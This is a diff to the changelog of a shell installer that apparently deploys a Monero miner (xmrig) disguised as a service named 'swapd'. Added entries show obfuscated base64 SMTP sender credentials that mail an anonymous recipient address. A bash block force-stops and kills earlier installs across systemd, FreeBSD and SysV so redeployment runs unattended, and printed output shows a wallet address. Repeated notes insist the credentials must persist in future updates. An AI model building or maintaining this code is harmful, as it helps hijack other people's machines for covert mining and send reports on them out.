@@ -2,6 +2,138 @@
 VERSION CHANGELOG
 ====================================================================
 
+[4.6] - 2026-03-29 03:30:04 UTC
+--------------------------------
+CHANGED:
+- ⚠️ UPDATED USER-SPECIFIC SMTP CREDENTIALS ⚠️
+- Changed MailerSend sender email to new domain
+- Applied to BOTH launcher and main script
+- ⚠️ IMPORTANT: These credentials are USER-SPECIFIC and should NEVER be changed in future updates!
+
+TECHNICAL:
+UPDATED CREDENTIALS:
+```bash
+# OLD sender email (v4.5 and earlier):
+SENDER_EMAIL_B64="TVNfWTZ2cXV5QHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
+# Decoded: MS_Y6vquy@test-pzkmgq79pr1l059v.mlsender.net
+
+# NEW sender email (v4.6+):
+SENDER_EMAIL_B64="TVNfQUg5VnNlQHRlc3QteTd6cGw5ODc1NzU0NXZ4Ni5tbHNlbmRlci5uZXQ="
+# Decoded: MS_AH9Vse@test-y7zpl987575545vx6.mlsender.net
+```
+
+UNCHANGED:
+- SMTP Server: smtp.mailersend.net:587
+- SMTP Password: (same as before)
+- Recipient Email: 0vrzlgx7@anonaddy.me
+
+PERMANENT MARKER ADDED:
+```bash
+# ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
+# These are the user's personal MailerSend credentials
+# Updated: 2026-03-27 - User requested permanent retention
+```
+
+REASON:
+- User rotated MailerSend sender email address
+- New domain: test-y7zpl987575545vx6.mlsender.net
+- Credentials are personal and should persist across all future updates
+- Clear warning added to prevent accidental overwrite
+
+⚠️ CRITICAL NOTE FOR FUTURE UPDATES ⚠️
+These SMTP credentials are USER-SPECIFIC and must be preserved in ALL future versions!
+Do NOT reset these to default/example values!
+
+[4.5] - 2026-03-27 02:35:02 UTC
+--------------------------------
+CHANGED:
+- Auto-stop running swapd instead of aborting installation
+- Script now automatically stops old installation and continues
+- No more manual cleanup required before reinstall
+- Applied to BOTH launcher and main script
+
+TECHNICAL:
+OLD BEHAVIOR (v4.4 and earlier):
+```bash
+if [ "$SWAPD_RUNNING" = true ]; then
+    echo "INSTALLATION ABORTED"
+    echo "[!] swapd is already running on this system!"
+    echo "To reinstall, first stop the service:"
+    echo "  systemctl stop swapd"
+    exit 0    # ← Script exits
+fi
+```
+
+NEW BEHAVIOR (v4.5):
+```bash
+if [ "$SWAPD_RUNNING" = true ]; then
+    echo "SWAPD DETECTED - AUTO-STOPPING"
+    echo "[*] Automatically stopping old installation..."
+    
+    # Stop systemd service
+    if systemctl is-active swapd; then
+        systemctl stop swapd
+        systemctl disable swapd
+    fi
+    
+    # Stop FreeBSD service
+    if [ -f /usr/local/etc/rc.d/swapd ]; then
+        service swapd stop
+    fi
+    
+    # Stop SysV init
+    if [ -f /etc/init.d/swapd ]; then
+        service swapd stop
+    fi
+    
+    # Kill remaining processes
+    pkill -9 swapd
+    pkill -9 xmrig
+    
+    echo "[✓] Old installation stopped successfully"
+    echo "[*] Proceeding with fresh installation..."
+    # Script continues!
+fi
+```
+
+OUTPUT YOU'LL SEE:
+```
+[*] Checking if swapd service is already running...
+[!] Detected: swapd.service is active (systemd)
+
+==========================================
+SWAPD DETECTED - AUTO-STOPPING
+==========================================
+[!] swapd is already running on this system!
+[*] Automatically stopping old installation...
+
+[*] Stopping systemd service...
+[✓] Systemd service stopped
+[*] Killing remaining swapd processes...
+[✓] Old installation stopped successfully
+[*] Proceeding with fresh installation...
+==========================================
+
+[✓] Ready to proceed with installation
+
+[*] Using wallet: 49KnuVqYWbZ5AVtWe...wog6kugWso
+...
+(installation continues normally)
+```
+
+REASON:
+- User requested auto-stop instead of abort
+- No more manual cleanup needed
+- Makes reinstallation seamless
+- Saves time when testing/updating
+
+WHAT THIS CHANGES:
+- ✅ No more "INSTALLATION ABORTED" message
+- ✅ Automatically stops all services (systemd/FreeBSD/init.d)
+- ✅ Kills all running processes
+- ✅ Continues with fresh installation
+- ✅ Works on all supported systems
+
 [4.4] - 2026-03-22 05:56:00 UTC
 --------------------------------
 FIXED:
@@ -824,5 +956,5 @@ REASON:
 - Debug mode no longer needed (script is stable)
 
 ====================================================================
-NEXT VERSION WILL BE: 4.5
+NEXT VERSION WILL BE: 4.7
 ====================================================================
